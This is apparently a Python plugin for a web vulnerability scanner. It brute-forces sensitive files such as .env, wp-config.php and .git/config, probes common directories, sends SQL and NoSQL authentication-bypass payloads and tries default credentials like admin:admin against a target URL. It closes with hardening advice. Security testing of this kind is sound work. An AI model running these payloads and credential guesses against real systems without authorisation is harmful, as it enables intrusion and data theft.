"""
Last Resort Exploit Plugin

This plugin provides fallback and "last resort" exploitation strategies
when standard exploit plugins fail. It includes:
- Directory and file brute-forcing
- Common authentication bypass attempts
- Default credential testing
- Basic injection attempts
- Configuration file discovery
- Generic vulnerability probing
"""

import sys
import os
from typing import Dict, List, Any, Optional, Set
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.adaptive_exploit_mixin import AdaptiveExploitMixin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)


class LastResortExploitPlugin(ExploitPlugin, AdaptiveExploitMixin):
    """
    Last resort exploit plugin for fallback exploitation strategies.
    
    This plugin is invoked when:
    - No specific plugin exists for a vulnerability type
    - A specific plugin failed to exploit a vulnerability
    - Generic brute-force/discovery is needed
    """
    
    # Common sensitive files for brute-forcing
    COMMON_SENSITIVE_FILES = [
        # Configuration files
        'config.php', 'configuration.php', 'settings.php', 'config.inc.php',
        'config.json', 'config.xml', 'config.yml', 'config.yaml',
        'app.config', 'web.config', 'appsettings.json',
        'database.yml', 'database.php', 'db.php', 'conn.php',
        
        # Environment files
        '.env', '.env.local', '.env.production', '.env.development',
        '.env.backup', '.env.old', '.env.save',
        
        # WordPress
        'wp-config.php', 'wp-config.bak', 'wp-config.old',
        
        # Joomla
        'configuration.php', 'configuration.php.bak',
        
        # Drupal
        'settings.php', 'settings.local.php',
        
        # Git
        '.git/config', '.git/HEAD', '.gitignore',
        
        # SVN
        '.svn/entries', '.svn/wc.db',
        
        # Backups
        'backup.sql', 'database.sql', 'dump.sql',
        'backup.zip', 'backup.tar.gz', 'site-backup.zip',
        
        # Logs
        'error.log', 'access.log', 'debug.log',
        'error_log', 'access_log',
        
        # Admin panels
        'admin.php', 'admin/', 'administrator/', 'wp-admin/',
        'phpmyadmin/', 'pma/', 'cpanel/',
        
        # API keys
        'api_keys.txt', 'keys.txt', 'secrets.txt',
        
        # README/LICENSE
        'README.md', 'README.txt', 'LICENSE.txt',
        
        # Package managers
        'package.json', 'package-lock.json', 'composer.json',
        'requirements.txt', 'Gemfile', 'pom.xml',
    ]
    
    # Common directory paths
    COMMON_DIRECTORIES = [
        'admin', 'administrator', 'admin_area', 'admin-panel',
        'backup', 'backups', 'bak', 'old',
        'temp', 'tmp', 'test', 'dev',
        'api', 'api/v1', 'api/v2',
        'config', 'configuration', 'settings',
        'uploads', 'upload', 'files', 'media',
        'assets', 'static', 'public',
        'private', 'protected', 'internal',
        'logs', 'log',
        'db', 'database', 'data',
    ]
    
    # Common authentication bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        # SQL injection based
        "admin' OR '1'='1",
        "admin'--",
        "admin' #",
        "' OR 1=1--",
        "' OR 'x'='x",
        "admin' OR '1'='1'--",
        
        # NoSQL injection
        '{"$ne": null}',
        '{"$gt": ""}',
        
        # Boolean bypass
        'true',
        '1',
        'yes',
    ]
    
    # Common default credentials
    DEFAULT_CREDENTIALS = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '12345'),
        ('admin', 'admin123'),
        ('root', 'root'),
        ('root', 'toor'),
        ('administrator', 'administrator'),
        ('test', 'test'),
        ('guest', 'guest'),
    ]
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'last_resort'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'Last Resort Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Last resort exploitation strategies including brute-forcing, '
            'default credentials, and generic probing when other methods fail.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '1.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate last resort payloads based on context.
        
        Args:
            context: Optional context containing:
                    - attack_type: Type of attack to attempt (files, dirs, auth, creds)
                    - base_url: Base URL for path construction
        
        Returns:
            List of payloads
        """
        context = context or {}
        attack_type = context.get('attack_type', 'files')
        
        if attack_type == 'files':
            # Generate file discovery payloads with mutations
            base_files = self.COMMON_SENSITIVE_FILES[:20]  # Top 20
            return PayloadMutator.mutate_payload_list(
                base_files,
                mutation_types=['path', 'extension']
            )
        
        elif attack_type == 'dirs':
            return self.COMMON_DIRECTORIES[:15]  # Top 15
        
        elif attack_type == 'auth':
            return self.AUTH_BYPASS_PAYLOADS
        
        elif attack_type == 'creds':
            return [f"{user}:{passwd}" for user, passwd in self.DEFAULT_CREDENTIALS]
        
        return []
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute last resort exploitation attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - findings: List of discovered resources
                - evidence: Evidence of discoveries
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'last_resort',
            }
        
        config = config or {}
        config.update(self.get_adaptive_config_defaults())
        
        logger.info(f"Attempting last resort exploitation on {target_url}")
        
        findings: List[Dict[str, Any]] = []
        
        # Strategy 1: File brute-forcing
        logger.info("Strategy 1: Sensitive file discovery")
        file_findings = self._brute_force_files(target_url, config)
        findings.extend(file_findings)
        
        # Strategy 2: Directory brute-forcing
        logger.info("Strategy 2: Directory discovery")
        dir_findings = self._brute_force_directories(target_url, config)
        findings.extend(dir_findings)
        
        # Strategy 3: Authentication bypass
        if vulnerability_data.get('involves_auth'):
            logger.info("Strategy 3: Authentication bypass")
            auth_findings = self._attempt_auth_bypass(target_url, vulnerability_data, config)
            findings.extend(auth_findings)
        
        # Strategy 4: Default credentials
        if vulnerability_data.get('login_form'):
            logger.info("Strategy 4: Default credentials")
            cred_findings = self._try_default_credentials(target_url, vulnerability_data, config)
            findings.extend(cred_findings)
        
        if findings:
            return {
                'success': True,
                'findings': findings,
                'evidence': f'Last resort strategies discovered {len(findings)} finding(s)',
                'vulnerability_type': 'last_resort',
                'message': 'Fallback exploitation successful',
            }
        else:
            return {
                'success': False,
                'error': 'All last resort strategies exhausted without findings',
                'vulnerability_type': 'last_resort',
            }
    
    def _brute_force_files(self, base_url: str, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Brute-force common sensitive files.
        
        Args:
            base_url: Base URL
            config: Configuration dict
            
        Returns:
            List of findings
        """
        findings = []
        timeout = config.get('timeout', 5)
        verify_ssl = config.get('verify_ssl', False)
        
        from urllib.parse import urljoin
        
        # Generate file list with mutations
        file_list = PayloadMutator.mutate_payload_list(
            self.COMMON_SENSITIVE_FILES[:15],  # Top 15 files
            mutation_types=['path', 'extension']
        )
        
        # Limit to reasonable number
        file_list = list(set(file_list))[:50]
        
        for file_path in file_list:
            try:
                url = urljoin(base_url, file_path.lstrip('/'))
                response = self._adaptive_request(
                    url, method='GET',
                    timeout=timeout, verify_ssl=verify_ssl,
                    max_retries=1  # Single retry for brute-force
                )
                
                if response and response.status_code == 200:
                    # Additional check for meaningful content
                    if len(response.text) > 50:
                        findings.append({
                            'type': 'file_disclosure',
                            'path': file_path,
                            'url': url,
                            'status_code': response.status_code,
                            'size': len(response.text),
                            'preview': response.text[:200]
                        })
                        logger.info(f"Found exposed file: {file_path}")
                        
            except Exception as e:
                logger.debug(f"Error checking file {file_path}: {e}")
        
        return findings
    
    def _brute_force_directories(self, base_url: str, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Brute-force common directories.
        
        Args:
            base_url: Base URL
            config: Configuration dict
            
        Returns:
            List of findings
        """
        findings = []
        timeout = config.get('timeout', 5)
        verify_ssl = config.get('verify_ssl', False)
        
        from urllib.parse import urljoin
        
        for directory in self.COMMON_DIRECTORIES[:10]:  # Top 10 directories
            try:
                # Try with and without trailing slash
                for path in [directory, directory + '/']:
                    url = urljoin(base_url, path)
                    response = self._adaptive_request(
                        url, method='GET',
                        timeout=timeout, verify_ssl=verify_ssl,
                        max_retries=1
                    )
                    
                    if response:
                        # Check for successful access or directory listing
                        if response.status_code == 200:
                            findings.append({
                                'type': 'directory_found',
                                'path': path,
                                'url': url,
                                'status_code': response.status_code,
                            })
                            logger.info(f"Found accessible directory: {path}")
                            break
                        # Even 403 might indicate directory exists
                        elif response.status_code == 403:
                            findings.append({
                                'type': 'directory_exists',
                                'path': path,
                                'url': url,
                                'status_code': response.status_code,
                                'note': 'Directory exists but access forbidden'
                            })
                            break
                        
            except Exception as e:
                logger.debug(f"Error checking directory {directory}: {e}")
        
        return findings
    
    def _attempt_auth_bypass(self, target_url: str, vulnerability_data: Dict[str, Any],
                            config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Attempt authentication bypass using common payloads.
        
        Args:
            target_url: Target URL
            vulnerability_data: Vulnerability data
            config: Configuration dict
            
        Returns:
            List of findings
        """
        findings = []
        parameter = vulnerability_data.get('parameter', 'username')
        
        for payload in self.AUTH_BYPASS_PAYLOADS[:5]:  # Top 5 bypass payloads
            result = self._try_multiple_methods(
                target_url, payload, parameter, config
            )
            
            if result.get('success'):
                findings.append({
                    'type': 'auth_bypass',
                    'payload': payload,
                    'parameter': parameter,
                    'method': result.get('method'),
                    'evidence': 'Authentication bypass successful'
                })
                logger.info(f"Authentication bypass successful with payload: {payload}")
                break
        
        return findings
    
    def _try_default_credentials(self, target_url: str, vulnerability_data: Dict[str, Any],
                                 config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Try common default credentials.
        
        Args:
            target_url: Target URL
            vulnerability_data: Vulnerability data
            config: Configuration dict
            
        Returns:
            List of findings
        """
        findings = []
        timeout = config.get('timeout', 5)
        verify_ssl = config.get('verify_ssl', False)
        
        username_param = vulnerability_data.get('username_param', 'username')
        password_param = vulnerability_data.get('password_param', 'password')
        
        for username, password in self.DEFAULT_CREDENTIALS[:5]:  # Top 5 credentials
            try:
                data = {
                    username_param: username,
                    password_param: password,
                }
                
                response = self._adaptive_request(
                    target_url, method='POST',
                    data=data,
                    timeout=timeout, verify_ssl=verify_ssl,
                    max_retries=1
                )
                
                if response:
                    # Check for successful login indicators
                    if (response.status_code == 200 or response.status_code == 302):
                        # Look for success indicators
                        success_indicators = ['welcome', 'dashboard', 'success', 'logged in']
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            findings.append({
                                'type': 'default_credentials',
                                'username': username,
                                'password': password,
                                'evidence': 'Default credentials successful'
                            })
                            logger.info(f"Default credentials worked: {username}:{password}")
                            break
                    
            except Exception as e:
                logger.debug(f"Error trying credentials {username}:{password}: {e}")
        
        return findings
    
    def get_severity_level(self) -> str:
        """Return the typical severity level."""
        return 'varies'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice."""
        return (
            'General security hardening:\n'
            '1. Remove sensitive files from web-accessible directories\n'
            '2. Disable directory listing\n'
            '3. Implement strong authentication\n'
            '4. Change default credentials\n'
            '5. Use .htaccess or equivalent to protect sensitive paths\n'
            '6. Implement rate limiting\n'
            '7. Use security headers\n'
            '8. Regular security audits\n'
        )
